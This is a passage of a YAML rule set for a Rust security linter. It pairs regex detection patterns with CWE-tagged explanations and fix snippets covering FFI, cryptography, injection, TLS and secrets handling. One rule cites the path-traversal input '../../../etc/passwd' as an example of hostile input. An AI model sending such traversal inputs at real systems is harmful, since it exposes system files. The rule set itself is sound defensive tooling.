- memory-safety
rule:
  kind: function_call
  pattern: extern\s+"C"
note: 'C code may store the pointer, but Rust may move the value invalidating it.


  Fix: Use Box::into_raw or Pin<Box<T>> for values passed to C.


  Reference: Rustonomicon - FFI - https://doc.rust-lang.org/nomicon/ffi.html

  '
---
id: rust-cwe-248-panic-across-ffi
language: rust
severity: error
message: 'CWE-248: Panicking across FFI boundary is undefined behavior'
tags:
- security
- ffi
- exception-handling
- CWE-248
rule:
  kind: macro_call
  pattern: panic!\(
note: "Unwinding across FFI boundary is undefined behavior and can corrupt C code\
  \ state.\n\nFix: Use catch_unwind and convert to error code, or use extern \"C-unwind\"\
  .\nExample:\n#[no_mangle]\npub extern \"C\" fn process() -> i32 {\n    match std::panic::catch_unwind(||\
  \ { /* work */ }) {\n        Ok(_) => 0,\n        Err(_) => -1,\n    }\n}\n\nReference:\
  \ RFC 2945 - https://rust-lang.github.io/rfcs/2945-c-unwind-abi.html\n"
---
id: rust-sec-023-cstring-null-check
language: rust
severity: warning
message: CString::new without handling interior nulls may truncate string
tags:
- security
- ffi
- input-validation
rule:
  kind: function_call
  pattern: CString::new\(
note: 'Interior null bytes truncate the string when passed to C, potentially causing

  security issues.


  Fix: Handle the NulError, or validate/sanitize input for null bytes.


  Reference: CString::new - https://doc.rust-lang.org/std/ffi/struct.CString.html#method.new

  '
---
id: rust-sec-024-cstr-pointer-lifetime
language: rust
severity: warning
message: CStr pointer may become dangling when CStr is dropped
tags:
- security
- ffi
- memory-safety
rule:
  kind: function_call
  pattern: as_ptr\(\)
note: 'The pointer becomes dangling when CStr is dropped.


  Fix: Ensure CStr lives as long as the pointer is used.


  Reference: CStr::as_ptr - https://doc.rust-lang.org/std/ffi/struct.CStr.html#method.as_ptr

  '
---
id: rust-sec-025-ffi-return-value-unvalidated
language: rust
severity: warning
message: Using C function return value without validation may cause undefined behavior
tags:
- security
- ffi
- error-handling
rule:
  kind: unsafe_block
  pattern: unsafe
note: 'C functions may return invalid pointers, negative lengths, or error codes.


  Fix: Always check return values and handle errors appropriately.


  Reference: Secure Coding Practices

  '
---
id: rust-sec-026-incorrect-extern-abi
language: rust
severity: warning
message: Incorrect extern block ABI causes calling convention mismatch
tags:
- security
- ffi
rule:
  kind: extern_declaration
  pattern: extern\s+"[^C]"
note: 'Wrong ABI causes undefined behavior due to calling convention mismatch.


  Fix: Use correct ABI string ("C", "system", "stdcall", etc.).


  Reference: FFI - https://doc.rust-lang.org/nomicon/ffi.html#foreign-calling-conventions

  '
---
id: rust-sec-027-enum-to-c-without-repr
language: rust
severity: warning
message: 'Passing Rust enum to C without #[repr(C)] has unspecified layout'
tags:
- security
- ffi
- type-safety
rule:
  kind: enum_declaration
  pattern: enum\s+\w+
note: 'Rust enum layout is unspecified and incompatible with C.


  Fix: Add #[repr(C)] or #[repr(i32)] to enum.


  Reference: Type Layout - https://doc.rust-lang.org/reference/type-layout.html

  '
---
id: rust-sec-028-non-ffi-safe-types
language: rust
severity: error
message: Using non-FFI-safe types in extern function signature is undefined behavior
tags:
- security
- ffi
- type-safety
rule:
  kind: function_declaration
  pattern: extern\s+"C"\s+fn.*(?:String|Vec|Option)
note: 'Types like String, Vec, Option have Rust-specific layouts incompatible with
  C.


  Fix: Use C-compatible types (*const c_char, *mut T, etc.).


  Reference: #[deny(improper_ctypes)]

  '
---
id: rust-sec-029-mutable-static-ffi-callback
language: rust
severity: warning
message: Modifying static variable in FFI callback causes potential data races
tags:
- security
- ffi
- concurrency
rule:
  kind: static_declaration
  pattern: static\s+mut
note: 'FFI callbacks may be called from multiple threads, causing data races.


  Fix: Use thread-safe synchronization (Mutex, AtomicPtr, etc.).


  Reference: static mut - https://doc.rust-lang.org/reference/items/static-items.html#mutable-statics

  '
---
id: rust-cwe-426-untrusted-dynamic-library
language: rust
severity: error
message: 'CWE-426: Loading untrusted shared libraries allows arbitrary code execution'
tags:
- security
- ffi
- CWE-426
rule:
  kind: function_call
  pattern: libloading::Library::new\(
note: 'Loading arbitrary shared libraries allows code execution.


  Fix: Validate library paths against allowlist, verify signatures.


  Reference: libloading security - https://docs.rs/libloading/

  '
---
id: rust-cwe-321-hardcoded-cryptographic-key
language: rust
severity: error
message: 'CWE-321: Hardcoded cryptographic keys can be extracted from binaries'
tags:
- security
- cryptography
- secrets
- CWE-321
rule:
  kind: variable_declaration
  pattern: (?:const|let)\s+\w*[Kk]ey\s*=\s*\[0x|b"
note: 'Hardcoded keys can be extracted from binaries and binary analysis.


  Fix: Use key derivation, environment variables, or secure key storage.


  Reference: CWE-321

  '
---
id: rust-sec-032-weak-rng-cryptography
language: rust
severity: warning
message: Using weak RNG for cryptographic purposes may not meet security requirements
tags:
- security
- cryptography
- randomness
rule:
  kind: function_call
  pattern: (?:rand::thread_rng|rand::random)
note: 'thread_rng() uses ChaCha12 which may not meet all security requirements.


  Fix: Use OsRng for cryptographic key generation.

  Example:

  use rand::rngs::OsRng;

  let mut key = [0u8; 32];

  OsRng.fill_bytes(&mut key);


  Reference: rand crate docs - https://docs.rs/rand/

  '
---
id: rust-cwe-327-broken-cryptography
language: rust
severity: warning
message: 'CWE-327: Using MD5 or SHA1 for security is cryptographically broken'
tags:
- security
- cryptography
- CWE-327
rule:
  kind: function_call
  pattern: (?:md5::compute|sha1::Sha1|MD5|SHA1)
note: 'MD5 and SHA1 are cryptographically broken and unsuitable for security purposes.


  Fix: Use SHA-256 or SHA-3 for hashing, Argon2/bcrypt for passwords.

  Example:

  use argon2::{Argon2, PasswordHasher};

  let salt = SaltString::generate(&mut OsRng);

  let hash = Argon2::default().hash_password(password.as_bytes(), &salt)?;


  Reference: NIST recommendations - https://csrc.nist.gov/projects/hash-functions

  '
---
id: rust-cwe-327-ecb-mode-encryption
language: rust
severity: error
message: 'CWE-327: ECB mode encryption reveals patterns in plaintext'
tags:
- security
- cryptography
- CWE-327
rule:
  kind: type_usage
  pattern: Ecb<
note: 'ECB mode reveals patterns in plaintext and is not semantically secure.


  Fix: Use GCM, CBC with random IV, or ChaCha20-Poly1305.


  Reference: Block cipher modes - https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation

  '
---
id: rust-cwe-330-reused-nonce-iv
language: rust
severity: error
message: 'CWE-330: Reusing nonces/IVs completely breaks encryption schemes like GCM'
tags:
- security
- cryptography
- randomness
- CWE-330
rule:
  kind: variable_assignment
  pattern: (?:nonce|iv|IV|NONCE)\s*=\s*\[
note: 'Nonce reuse completely breaks many encryption schemes, especially GCM.


  Fix: Generate unique nonce per encryption using counter or random:

  let mut nonce = [0u8; 12];

  OsRng.fill_bytes(&mut nonce);


  Reference: CWE-330

  '
---
id: rust-sec-036-missing-hmac-verification
language: rust
severity: warning
message: Decrypting without MAC verification enables padding oracle attacks
tags:
- security
- cryptography
rule:
  kind: function_call
  pattern: decrypt\(
note: 'Decrypting unauthenticated ciphertext enables padding oracle attacks.


  Fix: Use AEAD (AES-GCM, ChaCha20-Poly1305) or verify MAC before decryption

  (encrypt-then-MAC).


  Reference: Authenticated encryption - https://en.wikipedia.org/wiki/Authenticated_encryption

  '
---
id: rust-sec-037-small-rsa-key-size
language: rust
severity: warning
message: RSA keys under 2048 bits are considered weak
tags:
- security
- cryptography
rule:
  kind: function_call
  pattern: RsaPrivateKey::new.*1024
note: 'RSA keys under 2048 bits are considered weak.


  Fix: Use minimum 2048 bits for RSA, prefer 4096 for long-term security.


  Reference: NIST SP 800-131A - https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final

  '
---
id: rust-sec-038-weak-rng-secrets
language: rust
severity: warning
message: Using non-cryptographic RNG for secret material may be predictable
tags:
- security
- cryptography
- randomness
rule:
  kind: function_call
  pattern: rand::random
note: 'Non-cryptographic RNGs may be predictable for secret material.


  Fix: Use OsRng or ChaChaRng seeded from OsRng.


  Reference: rand security - https://rust-random.github.io/book/

  '
---
id: rust-sec-039-non-constant-time-secret-comparison
language: rust
severity: warning
message: Non-constant-time comparison of secrets leaks information via timing
tags:
- security
- cryptography
- timing-attack
rule:
  kind: binary_operation
  pattern: (?:==|!=).*secret|token|mac
note: 'Non-constant-time comparison leaks information via timing side channels.


  Fix: Use subtle::ConstantTimeEq or ring::constant_time::verify_slices_are_equal:

  use subtle::ConstantTimeEq;

  if received_mac.ct_eq(&computed_mac).into() { ... }


  Reference: Timing attacks - https://en.wikipedia.org/wiki/Timing_attack

  '
---
id: rust-sec-040-private-key-exposed-logs
language: rust
severity: warning
message: Exposing private keys in logs or errors reveals secrets
tags:
- security
- secrets
- logging
rule:
  kind: macro_call
  pattern: (?:println|dbg|log::debug).*key
note: 'Logging secrets exposes them in log files and debug output.


  Fix: Implement Debug that redacts sensitive data, use secrecy crate:

  use secrecy::{Secret, ExposeSecret};

  let key: Secret<[u8; 32]> = Secret::new(key_bytes);


  Reference: secrecy crate - https://docs.rs/secrecy/

  '
---
id: rust-cwe-789-unbounded-allocation
language: rust
severity: warning
message: 'CWE-789: Unbounded string or buffer allocation from user input'
tags:
- security
- input-validation
- denial-of-service
- CWE-789
rule:
  kind: function_call
  pattern: (?:Vec::with_capacity|String::with_capacity|vec!\[.*user|vec!\[.*input)
note: "Attacker-controlled size can exhaust memory (DoS).\n\nFix: Validate and limit\
  \ sizes against reasonable maximums:\nconst MAX_SIZE: usize = 10 * 1024 * 1024;\
  \ // 10MB\nif header.length as usize > MAX_SIZE {\n    return Err(Error::TooLarge);\n\
  }\n\nReference: CWE-789\n"
---
id: rust-sec-042-regex-denial-of-service
language: rust
severity: warning
message: Regex from user input may cause exponential backtracking (ReDoS)
tags:
- security
- input-validation
- denial-of-service
rule:
  kind: function_call
  pattern: (?:Regex::new|fancy_regex::Regex::new)\(.*user
note: 'Malicious regex can cause exponential backtracking (ReDoS).


  Fix: Use regex crate (guaranteed linear time), validate patterns, set timeouts.

  The Rust regex crate is safe - fancy_regex supports backtracking and is not.


  Reference: ReDoS - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

  '
---
id: rust-sec-043-format-string-user-input
language: rust
severity: info
message: Format specifiers in user input may cause unexpected output
tags:
- security
- input-validation
rule:
  kind: macro_call
  pattern: format!.*user|format!.*input
note: 'While Rust''s format! is memory-safe, it can still cause panics with user input

  containing format specifiers.


  Fix: Escape format specifiers or use "{}" with user input as argument only:

  Good: format!("{}", user_input)  // safe


  Reference: Format string best practices

  '
---
id: rust-sec-044-unsafe-deserialization
language: rust
severity: warning
message: Deserializing untrusted data without size limits may cause DoS
tags:
- security
- serialization
- input-validation
rule:
  kind: function_call
  pattern: (?:from_str|from_bytes|deserialize).*untrusted
note: 'Deserializing into types with complex Drop or large allocations can cause DoS.


  Fix: Limit nested depth, use size limits, validate before deserializing.


  Reference: serde security - https://github.com/serde-rs/serde/issues/1183

  '
---
id: rust-cwe-190-integer-overflow-size
language: rust
severity: warning
message: 'CWE-190: Integer overflow in size calculation leads to undersized buffer'
tags:
- security
- integer-safety
- CWE-190
rule:
  kind: binary_operation
  pattern: \*.*\*|width\s*\*\s*height
note: "Integer overflow in size calculations leads to undersized buffers and security\n\
  vulnerabilities.\n\nFix: Use checked_mul() or try_from():\nlet size = width\n  \
  \  .checked_mul(height)\n    .and_then(|s| s.checked_mul(bytes_per_pixel))\n   \
  \ .ok_or(Error::Overflow)?;\n\nReference: CWE-190\n"
---
id: rust-cwe-89-sql-injection-string
language: rust
severity: error
message: 'CWE-89: String interpolation in SQL query enables SQL injection'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: function_call
  pattern: format!.*SELECT|format!.*INSERT|format!.*UPDATE|format!.*DELETE
note: "String interpolation in SQL enables injection attacks.\n\nFix: Use parameterized\
  \ queries with ? or $1 placeholders:\nsqlx::query(\"SELECT * FROM users WHERE name\
  \ = $1\")\n    .bind(&name)\n    .fetch_all(&pool)\n    .await?\n\nReference: CWE-89\n"
---
id: rust-cwe-89-raw-sql-execution
language: rust
severity: error
message: 'CWE-89: Executing user-provided SQL allows arbitrary database operations'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: function_call
  pattern: query\(.*user|sql_query\(.*user
note: 'Executing user-provided SQL allows arbitrary database operations.


  Fix: Use query builders, whitelist allowed operations, or restrict to read-only
  views.


  Reference: CWE-89

  '
---
id: rust-cwe-89-dynamic-table-names
language: rust
severity: warning
message: 'CWE-89: Dynamic table/column names bypass parameter binding protection'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: function_call
  pattern: format!.*FROM|format!.*TABLE
note: "Dynamic identifiers bypass parameter binding protection.\n\nFix: Validate identifiers\
  \ against strict allowlist:\nconst ALLOWED_TABLES: &[&str] = &[\"users\", \"orders\"\
  ];\nif !ALLOWED_TABLES.contains(&table_name.as_str()) {\n    return Err(Error::InvalidTable);\n\
  }\n\nReference: CWE-89\n"
---
id: rust-sec-049-sql-like-injection
language: rust
severity: warning
message: LIKE pattern injection allows matching unintended data
tags:
- security
- sql-injection
rule:
  kind: function_call
  pattern: LIKE.*%|LIKE.*_
note: "LIKE wildcards (%, _) in user input can match unintended data.\n\nFix: Escape\
  \ LIKE special characters:\nlet escaped = search.replace('%', \"\\\\%\").replace('_',\
  \ \"\\\\_\");\nsqlx::query(\"SELECT * FROM users WHERE name LIKE $1\")\n    .bind(format!(\"\
  %{}%\", escaped))\n\nReference: SQL LIKE injection\n"
---
id: rust-sec-050-order-by-injection
language: rust
severity: warning
message: ORDER BY doesn't support parameters; injection enables information leakage
tags:
- security
- sql-injection
rule:
  kind: function_call
  pattern: ORDER\s+BY|order_by
note: 'ORDER BY doesn''t support parameters; injection enables information leakage.


  Fix: Whitelist allowed column names.


  Reference: Blind SQL injection via ORDER BY

  '
---
id: rust-cwe-78-command-injection-shell
language: rust
severity: error
message: 'CWE-78: Shell interpretation of command enables command injection'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: function_call
  pattern: Command::new\("sh"\)|Command::new\("cmd"
note: "Shell interpretation enables command injection via metacharacters.\n\nFix:\
  \ Pass arguments directly to Command without shell:\nCommand::new(\"grep\")\n  \
  \  .arg(pattern)  // No shell interpretation\n    .arg(\"/etc/passwd\")\n    .output()?\n\
  \nReference: CWE-78\n"
---
id: rust-cwe-78-user-controlled-program
language: rust
severity: error
message: 'CWE-78: User-controlled program path allows arbitrary code execution'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: function_call
  pattern: Command::new\(.*user|Command::new\(.*input
note: "Attacker can execute arbitrary programs.\n\nFix: Validate against allowlist\
  \ of permitted programs:\nconst ALLOWED: &[&str] = &[\"/usr/bin/ls\", \"/usr/bin/cat\"\
  ];\nif !ALLOWED.contains(&user_program.as_str()) {\n    return Err(Error::NotAllowed);\n\
  }\n\nReference: CWE-78\n"
---
id: rust-cwe-426-environment-variable-injection
language: rust
severity: warning
message: 'CWE-426: Malicious environment variables can alter program behavior'
tags:
- security
- environment
- CWE-426
rule:
  kind: function_call
  pattern: env\(.*user|env\(.*input
note: 'Malicious environment variables can alter program behavior (LD_PRELOAD, PATH).


  Fix: Sanitize or whitelist environment variable names.


  Reference: CWE-426

  '
---
id: rust-sec-054-command-spawn-output-handling
language: rust
severity: info
message: Spawning commands without output handling may cause deadlock
tags:
- security
- resource-management
rule:
  kind: function_call
  pattern: spawn\(\)
note: 'Child process may block if output buffers fill.


  Fix: Use output() or properly read stdout/stderr.


  Reference: Process deadlock

  '
---
id: rust-sec-055-async-process-no-timeout
language: rust
severity: warning
message: Process execution without timeout can exhaust resources
tags:
- security
- denial-of-service
rule:
  kind: function_call
  pattern: tokio::process::Command
note: 'Hanging processes can exhaust resources.


  Fix: Use tokio::time::timeout around process execution.


  Reference: Resource exhaustion

  '
---
id: rust-cwe-22-path-traversal
language: rust
severity: warning
message: 'CWE-22: Path concatenation with user input enables directory traversal'
tags:
- security
- path-traversal
- CWE-22
rule:
  kind: function_call
  pattern: join\(.*user|join\(.*input
note: "Input like ../../../etc/passwd escapes intended directory.\n\nFix: Canonicalize\
  \ and verify path starts with base directory:\nlet path = base_dir.join(&user_filename).canonicalize()?;\n\
  if !path.starts_with(&base_dir.canonicalize()?) {\n    return Err(Error::PathTraversal);\n\
  }\n\nReference: CWE-22\n"
---
id: rust-sec-057-symlink-following
language: rust
severity: warning
message: Following symlinks in sensitive operations may access unintended files
tags:
- security
- path-traversal
rule:
  kind: function_call
  pattern: read\(|write\(
note: "Symlinks can point outside intended directories.\n\nFix: Use symlink_metadata()\
  \ to check for symlinks:\nlet meta = std::fs::symlink_metadata(&path)?;\nif meta.file_type().is_symlink()\
  \ {\n    return Err(Error::SymlinkNotAllowed);\n}\n\nReference: CWE-59\n"
---
id: rust-cwe-367-toctou-file-operations
language: rust
severity: warning
message: 'CWE-367: TOCTOU race condition allows file state change between check and
  use'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: function_call
  pattern: exists\(\).*remove|is_file\(\).*read
note: "File can be changed between check and use.\n\nFix: Use file handles or atomic\
  \ operations:\nmatch std::fs::remove_file(path) {\n    Ok(()) => Ok(()),\n    Err(e)\
  \ if e.kind() == ErrorKind::NotFound => Ok(()),\n    Err(e) => Err(e),\n}\n\nReference:\
  \ CWE-367\n"
---
id: rust-sec-059-null-byte-path-injection
language: rust
severity: warning
message: Null bytes in file paths can truncate paths in FFI/system calls
tags:
- security
- path-traversal
rule:
  kind: variable_assignment
  pattern: path.*user|path.*input
note: 'Null bytes can truncate paths in FFI/system calls.


  Fix: Use OsString/PathBuf which handle nulls, or validate input.


  Reference: Null byte injection

  '
---
id: rust-sec-060-tempfile-race-condition
language: rust
severity: warning
message: Creating files with predictable names enables race conditions and symlink
  attacks
tags:
- security
- path-traversal
rule:
  kind: function_call
  pattern: '".*\.tmp|write\(".*\.tmp'
note: 'Race conditions and symlink attacks possible in world-writable directories.


  Fix: Use tempfile crate for secure temp file creation:

  use tempfile::NamedTempFile;

  let mut file = NamedTempFile::new()?;

  file.write_all(data)?;


  Reference: tempfile crate - https://docs.rs/tempfile/

  '
---
id: rust-cwe-295-tls-disabled-certificate-check
language: rust
severity: error
message: 'CWE-295: Disabling TLS certificate verification enables MITM attacks'
tags:
- security
- network
- tls
- CWE-295
rule:
  kind: function_call
  pattern: danger_accept_invalid_certs\(true\)
note: "Disabling certificate verification enables MITM attacks.\n\nFix: Use proper\
  \ CA certificates, only disable in tests:\nlet client = reqwest::Client::builder()\n\
  \    .use_rustls_tls()\n    .build()?;\n\nReference: CWE-295\n"
---
id: rust-sec-062-deprecated-tls-version
language: rust
severity: warning
message: TLS 1.0/1.1 have known vulnerabilities and are deprecated
tags:
- security
- network
- tls
rule:
  kind: function_call
  pattern: Protocol::Tls10|Protocol::Tls11
note: 'TLS 1.0/1.1 have known vulnerabilities.


  Fix: Use TLS 1.2 minimum, prefer TLS 1.3.


  Reference: TLS deprecation - https://datatracker.ietf.org/doc/rfc8996/

  '
---
id: rust-cwe-297-missing-hostname-verification
language: rust
severity: error
message: 'CWE-297: Missing hostname verification enables MITM with different domain
  cert'
tags:
- security
- network
- tls
- CWE-297
rule:
  kind: function_call
  pattern: ServerCertVerified::assertion|danger_accept_invalid_hostnames
note: 'Accepting any valid certificate enables MITM with different domain''s cert.


  Fix: Verify certificate''s Subject Alternative Name matches target hostname.


  Reference: CWE-297

  '
---
id: rust-sec-064-http-redirect-open
language: rust
severity: warning
message: Malicious HTTP redirects can leak credentials to attacker domains
tags:
- security
- network
rule:
  kind: function_call
  pattern: follow.*redirect
note: "Malicious redirects can leak credentials to attacker domains.\n\nFix: Limit\
  \ redirect count and validate destinations:\nlet client = reqwest::Client::builder()\n\
  \    .redirect(reqwest::redirect::Policy::limited(3))\n    .build()?;\n\nReference:\
  \ Open redirect\n"
---
id: rust-cwe-319-credentials-in-plaintext
language: rust
severity: error
message: 'CWE-319: Sending credentials over HTTP transmits plaintext'
tags:
- security
- network
- authentication
- CWE-319
rule:
  kind: function_call
  pattern: http://.*auth|http://.*token|http://.*password
note: "Credentials transmitted in plaintext can be intercepted.\n\nFix: Enforce HTTPS\
  \ for authenticated requests:\nif !url.scheme().eq_ignore_ascii_case(\"https\")\
  \ {\n    return Err(Error::InsecureScheme);\n}\n\nReference: CWE-319\n"
---
id: rust-cwe-918-ssrf-unvalidated-url
language: rust
severity: warning
message: 'CWE-918: Server-Side Request Forgery can access internal services'
tags:
- security
- network
- CWE-918
rule:
  kind: function_call
  pattern: get\(.*user|get\(.*input
note: "Server-Side Request Forgery can access internal services.\n\nFix: Validate\
  \ URL scheme and host against allowlist, block private IPs:\nfn validate_url(url:\
  \ &Url) -> Result<(), Error> {\n    if url.scheme() != \"https\" {\n        return\
  \ Err(Error::InvalidScheme);\n    }\n    if let Some(host) = url.host() {\n    \
  \    if is_private_ip(&host.to_string()) {\n            return Err(Error::PrivateIpBlocked);\n\
  \        }\n    }\n    Ok(())\n}\n\nReference: CWE-918\n"
---
id: rust-sec-067-dns-rebinding
language: rust
severity: warning
message: DNS rebinding bypasses same-origin policy
tags:
- security
- network
rule:
  kind: function_call
  pattern: resolve|get_host
note: 'DNS rebinding can bypass same-origin policy.


  Fix: Validate resolved IP against allowlist, use IP address directly.


  Reference: DNS rebinding

  '
---
id: rust-sec-068-unbounded-response-body
language: rust
severity: warning
message: Reading unbounded response body can cause OOM from malicious server
tags:
- security
- network
- denial-of-service
rule:
  kind: function_call
  pattern: bytes\(\)\.await
note: "Malicious server can send huge response causing OOM.\n\nFix: Stream response\
  \ with size limit:\nconst MAX_SIZE: u64 = 10 * 1024 * 1024;\nlet content_length\
  \ = response.content_length().unwrap_or(0);\nif content_length > MAX_SIZE {\n  \
  \  return Err(Error::ResponseTooLarge);\n}\n\nReference: Resource exhaustion\n"
---
id: rust-sec-069-weak-tls-ciphers
language: rust
severity: warning
message: Weak TLS cipher suites (RC4, 3DES) can be broken
tags:
- security
- network
- tls
rule:
  kind: function_call
  pattern: RC4|3DES|export
note: 'Weak ciphers can be broken with available tools.


  Fix: Use modern cipher suites (AES-GCM, ChaCha20-Poly1305).


  Reference: Mozilla SSL Config - https://ssl-config.mozilla.org/

  '
---
id: rust-sec-070-missing-certificate-pinning
language: rust
severity: warning
message: Missing certificate pinning for sensitive operations allows CA compromise
tags:
- security
- network
- tls
rule:
  kind: function_call
  pattern: https://
note: 'CA compromise could enable MITM for sensitive operations.


  Fix: Implement certificate pinning for critical endpoints.


  Reference: Certificate pinning - https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning

  '
---
id: rust-cwe-798-hardcoded-credentials
language: rust
severity: error
message: 'CWE-798: Hardcoded credentials can be extracted from binaries'
tags:
- security
- authentication
- secrets
- CWE-798
rule:
  kind: variable_assignment
  pattern: (?:PASSWORD|password|ADMIN|admin|SECRET)\s*=\s*"[^"]+"
note: 'Hardcoded credentials can be extracted from binaries.


  Fix: Use environment variables or secure credential storage.


  Reference: CWE-798

  '
---
id: rust-cwe-520-weak-password-hashing
language: rust
severity: error
message: 'CWE-520: Using unsalted SHA256 for password hashing enables rainbow table
  attacks'
tags:
- security
- authentication
- cryptography
- CWE-520
rule:
  kind: function_call
  pattern: sha256\(.*password|Sha256::digest
note: 'Unsalted hashes enable rainbow table attacks.


  Fix: Use Argon2, bcrypt, or scrypt with proper parameters:

  use argon2::{Argon2, PasswordHasher};

  let salt = SaltString::generate(&mut OsRng);

  let hash = Argon2::default().hash_password(password.as_bytes(), &salt)?;


  Reference: OWASP Password Storage - https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

  '
---
id: rust-sec-073-jwt-without-verification
language: rust
severity: error
message: Unverified JWTs can be forged by attackers
tags:
- security
- authentication
- cryptography
rule:
  kind: function_call
  pattern: decode\(.*DecodingKey::from_secret|decode\(.*no.*verif
note: "Unverified JWTs can be forged by attackers.\n\nFix: Always verify signature\
  \ with proper algorithm:\nlet mut validation = Validation::new(Algorithm::RS256);\n\
  validation.set_audience(&[\"my-service\"]);\nlet claims = jsonwebtoken::decode::<Claims>(\n\
  \    &token,\n    &DecodingKey::from_rsa_pem(public_key)?,\n    &validation\n)?;\n\
  \nReference: JWT vulnerabilities - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/\n"
---
id: rust-cwe-598-session-token-in-url
language: rust
severity: warning
message: 'CWE-598: Session IDs in query parameters are logged and cached'
tags:
- security
- authentication
- session-management
- CWE-598
rule:
  kind: function_call
  pattern: \?.*(?:session|token|sid)=
note: 'URLs are logged, cached, and visible in referrer headers.


  Fix: Use HTTP-only cookies or Authorization header.


  Reference: CWE-598

  '
---
id: rust-sec-075-missing-csrf-protection
language: rust
severity: warning
message: Missing CSRF protection enables unauthorized state-changing actions
tags:
- security
- authentication
rule:
  kind: function_call
  pattern: POST|PUT|DELETE
note: 'Cross-Site Request Forgery enables unauthorized actions.


  Fix: Use CSRF tokens, SameSite cookies, or check Origin header.


  Reference: OWASP CSRF - https://owasp.org/www-community/attacks/csrf

  '
---
id: rust-cwe-798-secrets-in-source
language: rust
severity: error
message: 'CWE-798: Source-controlled secrets are leaked in git history'
tags:
- security
- secrets
- source-control
- CWE-798
rule:
  kind: variable_assignment
  pattern: (?:API_KEY|api_key|TOKEN|token|SECRET)\s*=\s*"(?:sk-|ghp_|[A-Z0-9]{20,})"
note: 'Source-controlled secrets are leaked in git history.


  Fix: Use environment variables, secret managers, or config files (gitignored).


  Reference: CWE-798

  '
---
id: rust-sec-077-secrets-in-debug
language: rust
severity: warning
message: Debug logs may expose secrets insecurely
tags:
- security
- secrets
- logging
rule:
  kind: macro_call
  pattern: (?:dbg|debug|println).*(?:secret|key|token|password)
note: 'Debug logs may be stored or displayed insecurely.


  Fix: Use secrecy crate to prevent accidental exposure:

  use secrecy::{Secret, ExposeSecret};

  let key: Secret<[u8; 32]> = Secret::new(key_bytes);


  Reference: secrecy crate - https://docs.rs/secrecy/

  '
---
id: rust-sec-078-secrets-not-zeroed
language: rust
severity: warning
message: Secrets in String/Vec remain in memory after use
tags:
- security
- secrets
- memory-safety
rule:
  kind: variable_declaration
  pattern: let\s+(?:mut\s+)?(?:password|secret|key)\s*=\s*String
note: 'Secrets remain in memory after use, vulnerable to memory dumps.


  Fix: Use zeroize crate or secrecy''s SecretString:

  use zeroize::Zeroize;

  let mut password = String::from("secret");

  password.zeroize(); // Securely zeroes memory


  Reference: zeroize crate - https://docs.rs/zeroize/

  '
---
id: rust-cwe-209-secrets-in-error-messages
language: rust
severity: warning
message: 'CWE-209: Secrets in error messages may be logged or displayed'
tags:
- security
- secrets
- error-handling
- CWE-209
rule:
  kind: function_call
  pattern: format!.*(?:secret|key|token|password)
note: 'Error messages may be logged or displayed to users.


  Fix: Never include secrets in error messages.


  Reference: CWE-209

  '
---
id: rust-sec-080-secrets-in-panic
language: rust
severity: warning
message: Panic messages may be displayed or logged containing secrets
tags:
- security
- secrets
- error-handling
rule:
  kind: macro_call
  pattern: panic!.*(?:token|secret|key|password)
note: 'Panic messages may be displayed or logged.


  Fix: Use generic panic messages without sensitive data.


  Reference: CWE-209

  '
---
id: rust-cwe-208-timing-attack-user-enumeration
language: rust
severity: warning
message: 'CWE-208: Response time differences reveal valid usernames'
tags:
- security
- timing-attack
- authentication
- CWE-208
rule:
  kind: function_call
  pattern: return.*false|return.*early
note: 'Response time differences reveal valid usernames.


  Fix: Add constant delay or hash dummy password for invalid users.


  Reference: CWE-208

  '
---
id: rust-sec-082-early-return-authentication
language: rust
severity: warning
message: Early returns in authentication allow user enumeration
tags:
- security
- timing-attack
- authentication
rule:
  kind: control_flow
  pattern: return
note: 'Early returns allow attackers to enumerate valid usernames.


  Fix: Perform all checks, use constant-time comparison.


  Reference: User enumeration

  '
---
id: rust-sec-083-authentication-timing-leak
language: rust
severity: warning
message: Non-constant-time authentication check leaks information via timing
tags:
- security
- timing-attack
- authentication
rule:
  kind: binary_operation
  pattern: ==.*password|==.*token
note: 'Response time differences reveal valid usernames.


  Fix: Use constant-time comparison for all checks.


  Reference: CWE-208

  '
---
id: rust-cwe-190-integer-overflow-release
language: rust
severity: warning
message: 'CWE-190: Integer overflow wraps silently in release mode'
tags:
- security
- integer-safety
- CWE-190
rule:
  kind: binary_operation
  pattern: '[a-zA-Z0-9_]+\s*\+\s*[a-zA-Z0-9_]+'
note: "Integer overflow wraps in release mode (debug panics).\n\nFix: Use checked_*,\
  \ saturating_*, or overflowing_* methods:\nlet total = count.checked_mul(item_size)\n\
  \    .ok_or(Error::Overflow)?;\n\nReference: CWE-190\n"
---
id: rust-cwe-197-integer-truncation
language: rust
severity: warning
message: 'CWE-197: Casting larger to smaller integer type truncates without warning'
tags:
- security
- integer-safety
- CWE-197
rule:
  kind: type_cast
  pattern: as\s+(?:u8|u16|i8|i16)
note: 'Casting larger to smaller integers truncates without warning.


  Fix: Use try_from() or validate range before casting:

  let byte = u8::try_from(large_value)?;


  Reference: CWE-197

  '
---
id: rust-cwe-195-signed-unsigned-conversion
language: rust
severity: warning
message: 'CWE-195: Negative signed integers become very large unsigned values'
tags:
- security
- integer-safety
- CWE-195
rule:
  kind: type_cast
  pattern: as\s+(?:usize|u32|u64)
note: "Negative numbers become very large unsigned values.\n\nFix: Check for negative\
  \ values or use try_from():\nlet result = if value < 0 {\n    return Err(Error::Negative);\n\
  } else {\n    value as usize\n};\n\nReference: CWE-195\n"
---
id: rust-cwe-369-division-by-zero
language: rust
severity: warning
message: 'CWE-369: Division by zero panics and causes potential DoS'
tags:
- security
- integer-safety
- denial-of-service
- CWE-369
rule:
  kind: binary_operation
  pattern: /\s*\w+
note: "Division by zero panics, potential DoS.\n\nFix: Check for zero or use checked_div():\n\
  let result = total.checked_div(count)\n    .ok_or(Error::DivisionByZero)?;\n\nReference:\
  \ CWE-369\n"
---
id: rust-sec-088-shift-overflow
language: rust
severity: warning
